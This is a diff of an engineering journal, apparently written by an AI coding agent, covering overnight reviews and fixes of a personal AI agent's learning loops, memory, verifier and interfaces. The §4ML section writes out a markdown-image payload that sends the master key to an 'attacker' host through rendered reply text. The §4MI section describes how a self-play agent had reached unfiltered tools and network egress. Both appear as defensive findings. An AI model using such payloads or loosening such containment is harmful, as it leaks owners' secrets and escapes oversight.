@@ -51791,3 +51791,401 @@ Experiments on ghost in `~/Data/AI/ImgGen/qwen21/exp-4mh/` (the live node untouc
 - **Agent restart:** 20854 → 53607.
 - **Live probe `probe-4mh-sticker`** ("a sticker of a cute cartoon owl, with a transparent background"): the agent set `transparent` itself; rendered in 220 s; the PNG is RGBA, with 30% of pixels at α<16 — a clean cut-out.
 - **Rollback:** `IMGGEN_SD_CLI=qwen21/build/bin/sd-cli` in the unit, or restore the backup server.
+
+## §4MI — overnight review of the self-learning subsystem and the other major systems (2026-10-07 night, operator: "keep reviewing and fixing bugs and deficiencies on the self learning subsystem and all other major systems. you will work unattended until morning. the agent will be idle of traffic") — R0 scope, written first
+**Property under review.** Every background learning loop (idle phases, lesson lifecycle, dream/consolidation, post-mortem and
+failure distillation, the learned models, self-play/bench/skills-auto, the narratives and graph) (a) runs when its gate says
+it should and the ledger says truthfully what it did, (b) learns only from real, labelled, non-probe evidence, (c) writes
+only what some reader consumes, and (d) cannot destroy owner data or wedge the idle loop.
+**Threat model.** Trusted: the agent's own stores and code. Untrusted: model output (lessons, labels, generated challenges,
+narratives), tool results, probe/test/system traffic, member traffic, and any file the sandbox can write.
+**Out of scope.** Loop frequency and on/off decisions (operator's, §4LF); the nine concluded experiments; the image pipeline
+(§4MG/§4MH); anything the memory index marks closed/superseded (mirror-audit, earn-keep, ImgGen SD1.5); a prune re-enable
+(operator decision, skill-prune-off-by-default).
+**Protocol.** Fresh read-only reviewers per slice (A idle scheduler, B lessons, C dream, D post-mortem/distill/labels,
+E learned models + the health instrument, F self-play/bench/skills-auto, G narratives/episodes/graph) measuring on COPIES of
+the live data dir; every finding verified at source before a fix; class fixes with behaviour pins; battery per round
+(bat56+), suite ONCE at the end of a round; gated graceful deploy; labelled probes; journal + memory.
+**Leads at R0 (learning_health.py, 2026-10-07 23:40):** router checkpoint rewritten 409.6 h ago and every idle `router_train`
+since records "declined"; `foresight.gate` 186 buckets minted, 8 enabled, no consumer records a steer; `competence_component`
+and `uncertainty_pressure` DEAD in the calibration fit; postmortem 1/7 d, reflection 3/7 d.
+
+### §4MI — outcome (2026-10-08, 00:00–02:10, unattended)
+**Review.** Seven fresh read-only reviewers on a read-only snapshot of `system/` (one per slice), then one fresh reader on the
+fix batch (R3). Findings: 55 (A 9, B 10, C 9, D 8, E 5, F 12, G 13); CRIT-class 1 (self-play containment), MAJOR 31. Verified at
+source before any fix; the full ledger is `tmp/findings4mi.md` in the job dir.
+**What was wrong (measured on the live stores).** Lessons: the keyword gate admitted on two shared words whatever the query's
+length (a 119-word plan pulled five unrelated lessons and credited them "helpful" 27 s before the refute); 200 late refutes in
+two months retracted 0 lessons, and the only rows carrying a refuted turn's id were 25 reflection CORRECTIVES that a second
+retraction would delete. Learners: the router/PRM corpus held 162 reflection copies + 66 coding leaves (the same text labelled
+hard AND easy; 222/641 held-out twins), copies of 3 member and 10 probe turns re-entered through the reflection copy, the
+§4MF archive had shrunk the training population (Jaccard 0.854) with the look control reading removals as new evidence;
+foresight's ledger was 86 % probe rows last week. Labels: a designed refusal (clarify-first block, no-photo stop) booked the
+turn `structural failure` and debited its lessons; the same-error key was the browser banner, so distinct pages' errors
+collapsed and the post-mortem filed defects against flags that do not exist; the evolve reader of the defect queue keyed on a
+field no report carried (0/16 read); a late refute never reached the project work_log; 👎 never reached the episode; stored
+system prompts carried the owner's profile unredacted (82 rows/week). Scheduler: skills-auto ledgered "graduated 17" on every
+run (39 rows, 0 graduations); dream read as DEAD during 29 h of skip ticks; the imagine-gate anchor read a UTC stamp as local
+(3 h cooldown after every boot); self-play's finally wrote the clock the quiet-hours hold reads; autoadvance/stale-questions/
+narratives logged "ran" without working. Dream: 26 distilled lessons on skip ticks left no ledger row; failure distillation
+re-distilled one cluster 18×/week (sliding-window fingerprint) and admitted request-scoped, bench and quarantined rows; REM
+seeds admitted reflection/leaf rows; an unparseable REM reply was retried identically at T=0 three cycles and ledgered "ran";
+graph compression deleted with no archive; the 90-day archive ran only after a completed REM call. Self-play: no
+`restrict_tool_surface` — a dispatch miss re-registered every active macro with the unfiltered dict (web_search, postgres_admin
+from the host); `default_db` kept; Tor egress + host `browser`; job promotion on; self-play/probe/bench runs booked the owner's
+macro usage and acquired-skill telemetry; the journal curriculum had yielded 0 challenges in 65 days unlogged; exemplars kept the
+oldest three rows (a deploy-check probe shown to the owner). Memory: 21 member + 17 probe rows in the autobiography served by
+recall, member-thread graph rows and an on-demand profile mirror (the wife's description) hydrated into owner prompts, a
+query word seeded any node containing it ("back"→xtrabackup), the workspace prefix carried four-day-old probe commands and a
+narrative built from them.
+**Fixes (85 hunks, 25 files, every one commented `§4MI`).** Lessons: `_required_shared_words` (2/3/4 by query length) on
+admission, BM25 fallback and credit; folded stop list; retraction keeps correctives (`include_correctives=False`), twin scrub
+by trigger only when one is kept, "removed nothing" logged; verified-undo restores confidence; replacement chains archived;
+diary fallback filters mistake-less/self-play/bench rows. Learners: `iter_teachable(consumer=)` applies the admissibility
+kinds (router/PRM/postmortem/skills-auto/REM/macro mining/online holdout) and judges a reflection copy by its source's role
+(copies now stamped); router/PRM read `include_archive=True`; `_evidence_unchanged` ignores removals; foresight predicts
+only on owner/job turns and `ledger_stats` skips non-owner rows. Labels: `DESIGNED_STOP_REASONS` (clarify_first,
+subject_photo_missing, confirm_dead_end) — the recorder marks the row, `tool_failure_flags`/rule 3/the strike ledger/the
+extractor skip it, the no-photo error is one; `_repeated_error_key` = error line (banner skipped, prefix stripped, volatile
+collapsed, URL kept); `DefectReport.tool`; `extra.project_id` (drain-time pid on the streamed path) + `_late_verdict_to_work_log`;
+👎 → `_relabel_episode`; profile values redacted by value (whole words; short values case-sensitive; placeholders
+denied); openai-key boundary; archive stamps not cards. Scheduler: `graduate_changed`; declines are heartbeats (dream,
+self-play, skills-auto); imagine anchor UTC→local and the later persisted anchor wins; `last_owner_activity_time` (owner
+kind only) for quiet hours; honest "ran" appends; self-play row carries its status; bench row rides the finally; post-mortem
+reads 14 days. Dream: side-output skip ticks ledgered; distill ≥50 % new handles + evidence-only corpus; heuristics-only
+prompt on the trajectory path; unparseable = `phase=error`, stamped after the second identical failure; archive before the
+REM call; cache warnings; compression archives + logs; digit-distinct names never merge; seed word must be a whole token ≥5;
+on-demand mirrors kept empty; agnostic workspace events kept 6 h in a project's prefix; counterfactual digest ignores
+counters. Self-play: `_contain_self_play_agent` → `restrict_tool_surface` (macros as a class, `_subagent_allowed_tools`),
+`browser` denied, `default_db`/notify cleared, container `network=none` (`GHOST_SELFPLAY_NETWORK=bridge` restores), job
+promotion off; `_usage_is_bookable` (probe/member/background/test never book), a promoted step is not a failed use; journal
+mining logs its empty yield; tie delta no longer shortens the cooldown; exemplars newest-stamped first; `skills_auto` matrix
+key. Instrument: bench-exclusion wording, 7-day decline note, foresight owner-only.
+**Data repair (`scripts/memory_repair_4mi.py`, trialled on a copy, then live with backups `*.pre-4mi.bak`):** autobiography
+−38 rows (21 member, 17 probe) → `autobiographical.removed-4mi.jsonl`; graph −48 rows (member/probe-window rows + the
+on-demand mirror; one ambiguous member row removed by hand) → `graph_pruned_archive.jsonl`; workspace −100 probe-window
+events + the narrative moved aside (regenerates from owner rows). Classified by trajectory role/kind and time window, never
+by content.
+**Verification.** Pins: `tests/test_4mi_review.py` (45 tests), `tests/test_memory_repair_4mi.py` (2); 6 existing pins
+updated to the new contracts (distill churn, frontier tie, extractor order, graph digits, two §4MG recency pins untouched).
+Battery bat56: 65 mutants over every fix of every round, **65/65 killed**, NOOP survives, tree pristine; 13 first-run survivors
+were test gaps closed the same round, 1 (twin scrub by a kept corrective's trigger) was EQUIVALENT — triggers are unique —
+and the guard was deleted. Full suite ONCE after the last edit: **28,960 passed, 0 failed, 66 skipped** (two chunks, 9:13 +
+8:52). Defects found INSIDE this review's own fixes (R8): 7 — the fresh reader's CRIT (profile rule without word boundaries,
+which would have shredded "markdown" on "Mark" and every `/Users/` path on the stock name "User"), its MAJOR (the streamed
+drain stamped the LIVE project id — the §4DG race reopened for a new consumer), the recency filter dropping rows with no
+mistake field (2 suite failures), a `%` log-format lint finding, the same-error key no longer stripping "Error:/failed:",
+a MagicMock profile reading as "on demand", and the first live probe showing the no-photo error was still a plain string.
+**Deploy + probes.** Two gated graceful restarts (53607 → 48075 → 74975; one process; 0 errors since boot). Probe
+`probe-4mi-ok`: "OK" in 6.9 s. Probe `probe-4mi-stop2` (a made-up violinist): `designed stop — image_generation asked the
+user to decide (not a strike)`, the second call blocked by the §4MG missing-subject block, the agent asked for a photo, turn
+outcome **verified** (before: `failed · structural failure`, strike 1/6, two lessons debited). `learning_health` renders the
+new wording (bench excluded by the direction gate; router "no outcome in 7 d" note).
+**Not done / for the operator.** (1) The profile rule also redacts the owner's first name in the OPERATOR's pretty log
+("<REDACTED_PROFILE> Ventiroplakos") — `pretty_log` shares `redact_text`; disable with `disabled_rules=("owner_profile",)`
+on the log config if unwanted. (2) Documented, not fixed (minor/design): PRM "skipped" line never printed (A-8); dream skip
+streak not persisted (A-9); `_response_fingerprint` collisions (D-8); the vector MEMORY CONTEXT tier is structurally empty
+(G-7: only 12 eligible rows exist); the contradiction log is write-only (G-8: retire or wire to introspect); profile `as_of`
+from smart-memory is the drain time (G-11); `uncertainty_pressure` dead by construction (E-5); foresight "invoked" still
+unmeasured in the yield view (E-4a: 5 invocations, all pre-09-23); Greek queries sit at a higher bar than English of the same
+token count (m-1); docs drift in memory_hydration/bus/episodes/profile/selfhood/workspace pages (G-13) beyond the pages
+corrected here (skills, readonly, banks, dream, autonomous_activity, safety, graph, outcome). (3) Self-play now runs the
+container with no network — if a future challenge legitimately needs pip, set `GHOST_SELFPLAY_NETWORK=bridge`. (4) The
+router will retrain on the next look that the honest overlap grants (it reads archived days again, so the population is the
+one it was gated on).
+
+### §4MI r2 — fresh-eye re-review of every §4MI change (2026-10-08 morning, operator: "review all your changes")
+**Review.** Four fresh read-only reviewers over all §4MI hunks, the data repair and the edited docs (lessons/learners;
+labels/turn loop; dream/self-play/idle; memory/redaction/repair). **1 CRIT + 8 MAJOR + ~15 MINOR, every one inside the
+§4MI batch** (R8: the batch's own defects now total 7 + 24).
+**CRIT.** The profile redaction rule sat inside `redact_text`, which also writes the memory journal (smart-memory's input)
+and the episode store: "my wife's birthday" would have been stored as `<REDACTED_PROFILE>`, the §4KY attribution gate
+accepts the placeholder as "stated", and a graph write superseded the real `HAS_WIFE` edge (all executed on copies). Live
+scan of every owner store for the hours it was deployed: 0 placeholders (journal, graph, episodes, vector, profile,
+playbook, autobiography); only my two probe rows carry it. Fix: the rule is `redact_profile_values`, applied ONLY to a
+stored trajectory's `system_prompt` (where the leak was measured); conversation text is not rewritten.
+**MAJOR (fixed).** (1) a dream ERROR and a self-play run that never concludes recorded the suppressing "declined" heartbeat →
+the DEAD alarm could never fire on a permanently broken loop (now "failed"; `idle_attempt_result_for_dream`,
+`SELF_PLAY_UNCONCLUDED_ATTEMPT`; skills-auto "failed" when every candidate crashed); (2) an unparseable REM reply still
+claimed `side_output=True` → ledgered, backoff reset; (3) self-play `network=none` still passed the Tor proxy → 75 s
+bootstrap wait per run (now no proxy, like replay); (4) the counterfactual digest still re-armed on `last_retrieved_req`
+(all `last_*` stamps now ignored); (5) after the no-photo stop stopped drawing strikes nothing bounded an identical retry →
+`_missing_subject_block` blocks the same name (a real respelling passes once); (6) the same-error key collapsed generic
+heads ("exit code: 1", "service exited immediately.") → key = error line + banner-free body; (7) the diary fix was in the
+wrong function (`get_recent_failures` is what the diary reads; the recency fallback is the empty-query injection, where
+positive rules belong — reverted there); (8) Greek function words counted as content words (folded Greek stop list);
+(9) the repair script's windows were anchored at the turn's END (a trajectory's timestamp is stamped after the reply): the
+live run removed 2 owner eckit commands and left 103 probe/member workspace events → windows cover the turn's body,
+`--correct-r2` restored the 2 rows in time order and removed the 103; graph rows are NOT re-judged (written after the turn
+by the drain — a body window cannot place them); 8 graph rows a body-window pass removed were restored by hand (two may be
+the owner's Revolut OSINT); (10) word⊂node seeding refused fragments then fell to the fuzzy tier ("tool"→`pool`) and dropped
+real short tokens → whole token (Unicode) or a ≥4-char token prefix that is ≥half the token; refused fragments never go fuzzy.
+**MINOR (fixed).** live outcomes ignore a trailing designed-stop mark (only corpus strings carry it); quiet hours read the
+owner clock with no idle-clock fallback; future anchors never adopted; `_dream_unparseable` keeps only the current window;
+owner `sched-`/`sub-` work books macro usage (only `sim-` excluded); a confidence-only re-check is not a "graduation";
+credit uses admission's tokenizer; a corrective's reinforcement survives retraction like the corrective; a probe's
+reflection copy never teaches; the router gate fingerprint carries the corpus policy (`kinds-4mi`: the cleaned corpus is a
+new question — one look); the bail message shows the overlap the decision used; `_digit_distinct` compares numbers only
+(`ubuntu 22.04`/`ubuntu-22-04` pair again) and the safe tier pairs past an odd first variant; the web_automation template
+no longer names the denied `browser` tool; lint `_sa_grew` init.
+**Not changed (documented):** notify targets set by ENV are not cleared by the self-play arg clearing (none set live);
+the graph compression archive drops valid_from/until (no reader); the profile rule matches whole stored values (a son's
+first name alone is not redacted); `_any_step_still_running` books nothing when a parallel macro mixes a promoted step and a
+real failure; the tombstone cache re-reads the archive after each chain archive.
+**Verification.** Battery bat56 rebuilt: **85 mutants, 84/84 non-control killed** (28 new r2 mutants; 9 first survived —
+all test gaps closed; 4 first-round mutants retargeted to the changed code), NOOP survives, tree pristine. Pins:
+`tests/test_4mi_review.py` 77, `tests/test_memory_repair_4mi.py` 4; 2 source-text pins rewritten as AST walks (ratchet);
+§4MG pin updated (an identical name is the same search). Full suite ONCE after the last edit: **28,984 passed, 0 failed,
+66 skipped**. Deploy 74975 → 46185 (gated, graceful, one process, 0 errors). Probes: `probe-4mi-r2-ok` "OK";
+`probe-4mi-r2-stop`: two designed stops (no strike), one allowed respelling, the third render blocked, the agent asked for a
+photo; corpus row `passed`, marks present, no error flags.
+
+## §4MJ — memory hydration: what reaches every prompt (2026-10-08, operator: "proceed" — hydration recommended after §4MI r2) — R0 scope, written first
+**Property under review.** For every turn, each hydration tier (vector "memory context", graph, episodes, skills/lessons,
+sessions, profile/owner facts, workspace/selfhood prefixes, volatile block) injects only items RELEVANT to this request,
+scoped to the REQUESTER (owner vs member, public vs DM, active project), within a budget whose cost is justified by use; and
+the same rules hold for `recall`/`search_my_past`, which read the same stores.
+**Threat model.** Trusted: store contents written by the owner's own turns. Untrusted: the request text (any language,
+any length), member/probe/sim-derived rows already in the stores, model-written rows (dream syntheses, graph extraction).
+**Out of scope.** Lesson admission (§4MI, just shipped), the knowledge-base document tier (§4LT), prompt-cache layout
+(§4LE), owner-fact attribution writes (§4KY/§4KZ) — read paths only here.
+**Leads.** §4MI G-3/G-4/G-5/G-7/G-13 (member graph rows, on-demand mirror, graph seeding junk, empty vector tier, docs
+drift); episodes injecting failure greetings; `_RELEVANCE_FLOOR=0.0`; Slack open-channel recall/hydration scoping (§4KJ).
+
+### §4MJ — outcome (2026-10-08)
+**Review.** Three fresh read-only reviewers on a snapshot: (1) relevance and cost per tier by replaying 80 real owner requests
+through the real bus with hand labels on 589 survivors; (2) scoping/leakage per surface (239-request replay + an end-to-end
+`handle_chat` scan); (3) code, docs fact-check and a 14-mutant battery of the existing tests.
+**Measured.** 12.8% of injected tokens relevant, 8.6% misleading; 39 of 74 hydrating turns got nothing relevant; 334
+tokens/turn. Per tier: episodic precision 0.16 (17% misleading), graph 0.09, skill 0.50, vector 0 items (structurally
+empty), sessions ≤4/88. **Member wall holds end to end** (0 of 13 owner private terms in any member prompt; public owner
+turns skip hydration).
+**Fixed.** Episodes: failed episodes with no lesson are not hydrated (2/87 relevant, rendered as the failed reply); a mostly
+non-Latin query needs two shared content words (the English embedder put any two Greek sentences ~0.1 apart); stored
+tool-call markup stripped. Graph: no fuzzy seeds in hydration (91 items, 0 relevant; recall keeps them), no generic hub words
+(`project` held every project's title → WebOS chains on 16% of turns), a chain contained in a longer chain is dropped (102
+pairs on 16% of turns). Sessions: the hit is the 240-char window with the most distinct terms and the floor counts inside
+it (two long replies matched 23/80 unrelated requests); the active session is excluded before the limit. Intent
+classifier: letter tokens, "how" procedural only as how-to, factual as how-old/many, ignored in greetings, "should" ignored
+(33/36 procedural turns were not how-to). Per-turn hydration stash (an overlapping turn took the single slot; 96/318 turns
+at risk) + a log line when a judge finds none. Per-tier timeout `GHOST_BUS_TIER_TIMEOUT_S` (8 s). Budget on the user's
+words. RRF refit reads only the gated era (17% probe/member rows before 2026-09-24 18:31). Owner public-channel turns not
+written to the autobiography. The owner's wife's name removed from a tool schema example. Docs: memory_hydration (k, the
+classifier, budgets, headers, injection site, publish dedup, belief-revision marked removed, 3×5 matrix, episodes floor
+0.70), bus (signature, session ranker, instrumentation example), episodes (0.70), memory.html (when hydration runs, where
+it lands, dedup), graph docstring (3-hop).
+**Verification.** `tests/test_4mj_hydration.py` (31) + 6 existing tests updated to the new contracts (two graph tests pinned
+the duplicate sub-paths; one episodic fixture; one refit fixture date). Battery bat57: 22 mutants, 22/22 killed, NOOP
+survives, tree pristine (one run first showed the NOOP "killed" — a graph test pinned the old duplicates; fixed before
+trusting any kill). Lens 3's 6 surviving mutants on existing tests (k, consensus normalisation, budget, raw-text intent,
+stash) now have pins. Full suite once after the last edit: **28,984 passed, 0 failed** (halves 8:37 + 8:12). Deploy
+46185 → 48369 (gated, graceful, one process, 0 errors). Probes: a greeting → intent contextual, 1 episode (was 5, mostly
+failed greetings); "how old is the Acropolis" → factual, 3 graph items; a Greek project question → nothing injected.
+**Not done (documented).** Graph nodes are English, so a Greek request seeds nothing (the Greek probe found no chess
+project); 56 episodes (16%) name deleted projects (`forget_project` does not reach episodes); 27 test-traffic episodes with
+no request id (origin unprovable — left); the vector "memory context" tier stays empty by design (every admissible type is a
+twin of another tier; it costs one embedding + query per turn — retire is the operator's call); the episodic and graph
+tiers remain low-precision after the fixes (re-measure on new turns); the usefulness judge agrees with hand labels only in
+aggregate (κ≈0.13 per turn).
+
+## §4MK — the verifier: are verdicts right, and what do they cost (2026-10-08, operator: "proceed") — R0 scope, written first
+**Property under review.** A verdict (CONFIRMED / REFUTED / UNCERTAIN, inline or late, cheap judge → escalation →
+claim binding → visual arm) matches what the turn's own evidence shows; a wrong verdict is rare and measured; every
+consumer of a verdict (corpus label, lessons, calibration, correction banner, repair loop, project follow-ups) reads the
+final one; the cost (calls, seconds, slot time) is bounded and justified.
+**Threat model.** Trusted: tool outputs as recorded. Untrusted: the reply (the claim), the judges' text, web content
+inside evidence, member/probe turns.
+**Out of scope.** Judge model choice (measured §4FY–§4GJ), the knowledge shadow (§4MF, follow-up 10-21), verify_bench
+saturation.
+**Baseline.** §4KK (09-25): 104 refutes adjudicated, 58 true / 42 false; paired replay 20 → 10 false reproduced.
+
+### §4MJ r2 + operator decisions (2026-10-08)
+**Fresh reader on my §4MJ fixes** found 4 defects inside them (R8). (1) The per-tier timeout (`GHOST_BUS_TIER_TIMEOUT_S`) leaked a thread per slow tier: hydration hung at turn 8 once the 14-worker pool was full. **Reverted**; the reason is written as a comment in `_fetch_all_tiers`. A bounded tier needs a cancellable store call, which we don't have. (2) The stash was a single slot inside the spawner. (3) "what's up"-style greetings were classified as factual. (4) The Greek follow-up check read the expanded query instead of `raw_user_text`. All four are fixed and pinned.
+**Operator: "retire the empty vector tier and clean up episodes that name deleted projects."** The vector tier is off (`GHOST_BUS_VECTOR_TIER=0` default; the log shows `v=-`; the conftest turns it on for old tests, and a `vector_tier_off` marker pins the retirement). A hard delete now forgets the project's episodes (`EpisodicMemory.forget_project`). It matches by id always, and by title only when the title is distinctive and no live title contains it or is contained in it. It reads only the episode's own text: matching tool-result listings had pulled in 129 episodes, the episode's own text gives 54. `scripts/memory_repair_4mj_episodes.py --apply` ran with the agent stopped: **54 episodes from 17 deleted projects** forgotten and archived to `episodes_forgotten.jsonl`, backup at `episodic_memory.db.pre-4mj.bak`. A re-run finds 0. The dream's `reconcile_indexes` reaps the vector twins. Battery bat57 decision mutants D23–D29: 7/7 killed.
+
+### §4MK — outcome
+**Measured** on owner turns 09-25 → 10-08, each verdict read against its own evidence:
+- refutes: 3 of 3 false;
+- confirms: 8 of 40 false (dates, image provenance);
+- main-model overturns: 7 of 22 wrong;
+- binder-decided refutes: 4 of 4 false;
+- the 65 s in-turn await blocked 27 of 83 owner turns (1,039 s) and caught 2 refutes, both false.
+
+**Fixed:**
+- **CRIT:** judges never saw earlier turns. A fact from an earlier "While you were away" notice was refuted as invented, the owner got a false correction, and a "hallucinated" lesson was written. Now `_earlier_turn_judge_evidence` adds earlier tool outputs and the leading system banners of earlier replies (never our own words), up to 3,000 chars, at both `verify_claim` sites.
+- Judges saw only the first 1,000 chars of the request. Now `JUDGE_REQUEST_CHARS` = 4000 (DB6 in a 2,956-char plan had been refuted).
+- The reply pack was 2,000 chars. Now 6,000 (3,600 head + tail).
+- The two-stage prompts are fenced.
+- Designed stops no longer count as a failed tool for the high-stakes flag.
+- Binder:
+  - decimal byte units are read on both sides, with the unit's own rounding factor;
+  - one claim must use one unit convention, and the elsewhere-downgrade does not undo that;
+  - a bare version is the head of a dotted one;
+  - a claim's date must be in the span (structured: month names vs ISO, ranges, clocks excluded).
+
+**Built and reverted:** a binder REFUTED→UNCERTAIN downgrade. It broke 4 refute-first pins, and the root causes were these rules; refute-first (§4IM) stands.
+
+**Defects inside my own fixes (R8): 3.** The decimal reading first used the binary factor (36.864 GB "agreed" with 36 GB). The mixed-convention refute was undone by `figure_elsewhere`. The downgrade above.
+
+**Verification:**
+- `tests/test_4mk_verifier.py`: 14 tests. Pack and request pins updated in `test_verifier_two_stage.py` and `test_constraint_lifecycle_and_claim_fairness.py`.
+- Battery bat58: 16 mutants. 11 killed on the first run; 4 survivors got new pins (wiring of the earlier-turn block, pack head, day mismatch, mixed vs elsewhere) and were then killed. The remaining survivor is equivalent: the cut at 3,000 chars hides the loop-budget break. NOOP control survives, tree stays pristine.
+- Full suite once after the last edit: **29,028 passed, 0 failed**.
+
+**Docs:**
+- verifier.html: new §4MK "current behaviour" section; stale 25 s await and `adversarial_probe` row fixed.
+- objection.html: the 0.7 floor is gone.
+- claim_binding.html: flag sentence, plus a §4MK rules section.
+- evidence_gate.html: two moves.
+- Repair-script docstring: it named a `--no-vector` flag that doesn't exist.
+
+**Deploy:** 48369 stopped (gated) → repair → 62039. The agent came back via launchd 5 s after the repair finished, before my bootstrap, so the bootstrap failed with "already loaded". One process, health ok.
+
+**Probes** (X-Ghost-Origin: probe): greeting ok; memory/disk report CONFIRMED 1.00 on the code route; follow-up and 2,164-char request both answered correctly. Those two ran no tools, so they got no verdict by design: the earlier-turn and long-request paths are pinned by tests only, not yet seen live.
+
+**Operator decisions open:**
+- remove the false "hallucinated" lesson (chroma id 26344) and relabel trajectory 3d27a6b0;
+- turn on the overturn rebuttal contract (`GHOST_VERIFY_OVERTURN_QUOTE`)?
+- keep or shorten the 65 s await;
+- the Greek graph gap: graph nodes are English, so Greek requests seed nothing.
+
+### §4MK operator decisions (2026-10-08, operator: "1 yes, 2 yes, 3 yes, 4 no")
+1. **False lesson removed, trajectory relabelled.** `scripts/memory_repair_4mk_lesson.py --apply`, run with the agent stopped (`bootout` first: last time a SIGTERM let KeepAlive respawn the agent within 5 s).
+   - Trajectory 3d27a6b0 → `passed` (source `operator`). Both of its refutes were false: the decimal-GB rule and the earlier-notice rule.
+   - Both lessons sourced from it are retracted from the playbook and the vector store (0 rows left): the "give me a morning briefinf" corrective (vector 26344) and a generalised "unsupported details" lesson drawn from the same false refute. Playbook backup: `skills_playbook.json.pre-4mk.bak`.
+2. **Overturn rebuttal contract ON:** `export GHOST_VERIFY_OVERTURN_QUOTE=1` in `bin/start-ghost-agent.sh`. The code default stays off for the bench. The 08-06 bench trade still applies: fewer false confirms, more false alarms on clean turns.
+3. **Repair await 65 s → 25 s:** `export GHOST_CRITIC_REPAIR_BUDGET=25` in the launcher. Verdicts slower than that still correct at the next turn.
+   - Launcher backup: `start-ghost-agent.sh.pre-4mk`.
+   - Docs and docstrings updated (verifier.html, `verifier.py`, `agent.py`).
+   - The flag-related tests pass (1,208); the only code edits were docstrings.
+   - Deploy 62039 → 73225: both flags are confirmed in the live process environment; 0 errors.
+   - **Watch:** the false-alarm rate on clean turns with the quote burden on, and whether the in-turn repairs that remain are true.
+4. **Greek graph gap:** not pursued (operator).
+
+## §4ML — the interfaces: web client, Slack bot, ClockworkPi, CLI (2026-10-08, operator: "proceed with interfaces") — R0 scope, written first
+**Property under review.** Each interface carries the owner's request to the agent, and carries back the answer and everything attached to it: stream, files, images, corrections, notifications, stop/cancel, status. Specifically:
+- it does so faithfully and only to the person it belongs to;
+- its status claims (connected, sent, delivered, done, failed) are true;
+- a failure is visible, not silent;
+- secrets never leave the host they belong on.
+
+**Threat model.**
+- Trusted: the owner, authenticated by the API key, or by Slack owner id on the bot.
+- Untrusted:
+  - every other Slack user and channel message;
+  - the agent's reply text when rendered (model output, which can carry web content), so anything the renderer treats as markup;
+  - uploaded files and their names;
+  - other tailnet peers;
+  - URLs and links inside replies.
+
+**In scope:**
+- `interface/server.py`, `voice.py`, `webpush_notify.py`, `static/*.js` and `index.html`.
+- `interface/externals/slack_bot/` and `slack_project_commands.py`.
+- `interface/externals/clockwork_ghost/` (Python, launcher, deploy, probe; the copy deployed on the device vs the repo).
+- `interface/externals/cli/ghost` and `bin/ghost`.
+- The agent-side endpoints these call (`src/ghost_agent/api/*.py`): chat stream, upload/download, notifications pending/ack, turns, stop, health.
+
+**Out of scope:**
+- the face visuals and their animation (§4GD–§4GF);
+- voice model quality;
+- cert renewal (§4KR);
+- the image node.
+
+**Baseline:**
+- §4GA–§4GC (web client, 55 findings shipped);
+- §4KU (ClockworkPi, 41 findings);
+- §4KJ (Slack tenant bleed: minimum cut);
+- the 2026-08-01 Slack workflow review.
+- Known open from memory: `slack_project_commands.py` is built but nothing imports it; the web-ui notification consumer should mirror the Slack ack contract.
+
+**Method.** Three fresh, read-only lenses in parallel: web (server, static, API); Slack bot; ClockworkPi and CLI. Each reads live logs and traffic for real failures, not only the code. Then:
+- class fixes with behaviour pins;
+- a battery with a NOOP control;
+- a fresh reader on my fixes;
+- the full suite once;
+- a gated deploy of each touched service (agent, `com.local.ghost-client`, `com.local.ghost-slackbot`, ClockworkPi `deploy.sh`);
+- labelled probes;
+- journal and memory.
+
+### §4ML — outcome (2026-10-08)
+**Lenses:** 3 fresh, read-only readers: web, Slack, ClockworkPi + CLI.
+- Web: 2 CRIT, 4 MAJOR, 3 minor.
+- Slack: 3 MAJOR, 7 minor.
+- ClockworkPi + CLI: 2 MAJOR (one shared with web), 8 minor.
+
+**CRIT, both fixed and reproduced in Chromium before and after.** Neither had happened in real traffic.
+1. **A reply image leaked the master key.** `installAuthFetch` attached `X-Ghost-Key` to any URL that *contained* `<host>/api/`. So `![c](https://attacker/c.png?x=<host>/api/download/index.html)` sent the key to the attacker with no click, and again on every reload. Fix: `_ownApiUrl` decides on the parsed origin and path, and gates the fetch wrapper, the image blob path and the PDF path.
+2. **The PDF frame ran agent HTML in the page's origin.** `x.html?.pdf` matched the PDF regex and loaded agent HTML into the unsandboxed native-viewer frame, where it read the key. Fix: the path must end `.pdf`, the bytes must start `%PDF-`, and the blob is retyped `application/pdf`.
+
+**MAJOR, fixed:**
+- **Replies fetched from foreign hosts.** They could load remote images and draw forms. Fix: `_PURIFY_CONFIG` forbids form controls and every tag or attribute that fetches on render; the reader found seven such routes after my first fix. `_neutraliseRemoteImages` turns a foreign image into a link.
+- **No CDN.** three.js r160 is vendored to `/static/vendor/three/`, the same files the uConsole uses, and Google Fonts are dropped.
+- **Voice was unbounded.** One held key exhausted the server's file descriptors: 135 × "Too many open files", and chat failed with it. Fix: separate STT and TTS pools of 2, a wait list of 4 (10 s for STT, 30 s for TTS), then 429; the child is killed on cancel.
+- **0.2 s clips became words.** They were heard as "The quick brown fox…" 12 times, and 2 of those reached the agent as owner turns. Fix: a 0.35 s floor.
+- **The turn caption adopted the first turn after send.** On the web and the device alike, it showed a member's, a probe's or self-play's turn (file names included) whenever ours queued. Fix: adopt only the corridor carrying our own request id.
+- **Slack: 👍/👎 on image posts was dropped** (3 of them the owner's). Fix: `_register_uploaded_files` indexes each upload's message ts.
+- **Slack: a restart lost a reply silently** (a 2,345-char answer). Fix: on SIGTERM every in-flight asker is told, in parallel inside launchd's 20 s window, and an entry leaves the in-flight list once its text is posted. Tested on the real `main()`.
+- **Slack: pre-wall member turns still counted as the owner's.** Plain 8-hex ids escaped the §4KJ `slack-` rule. `scripts/member_data_repair_4ml.py --apply`, run with the agent stopped, used the bot's reply index as the truth:
+  - restamped 123 trajectory rows: 98 unset→member, 20 unset→owner, and 5 owner turns wrongly stamped member restored to owner;
+  - removed 641 + 27 foresight, 163 calibration and 691 ranking-observation rows;
+  - forgot 19 episodes (never a text the owner also sent) and retracted 7 lessons, from the playbook and the vector store;
+  - matched the dry run exactly. Backups are `*.pre-4ml-20261008T130538.bak`.
+  - Not touched: knowledge-graph triplets, which carry no provenance.
+- **69 copies of the bot's secrets.** My battery's rsync of `interface/` had copied `.env`. All deleted; the runner and memory now `--exclude .env`.
+
+**Minor, fixed:**
+- error echo saved as the reply;
+- push acked when undelivered, now with bounded retries (10 cycles);
+- warnings with no exception type (13 sites);
+- docs drift (Slack project commands, ClockworkPi TLS);
+- CLI: unlabelable replies, quiet hours (the agent now returns `held`), ack check, `/cancel` names its turn, `--probe`, `~/.ghost_history` 0600 and no longer written by tests;
+- device stop races (a hard stop is not "dropped the connection"; a finished reply is not "stopped.");
+- `stream_log_lines` verifies TLS by default.
+
+**Defects inside my own fixes (R8): 13 from the fresh reader, plus 4 of my own.**
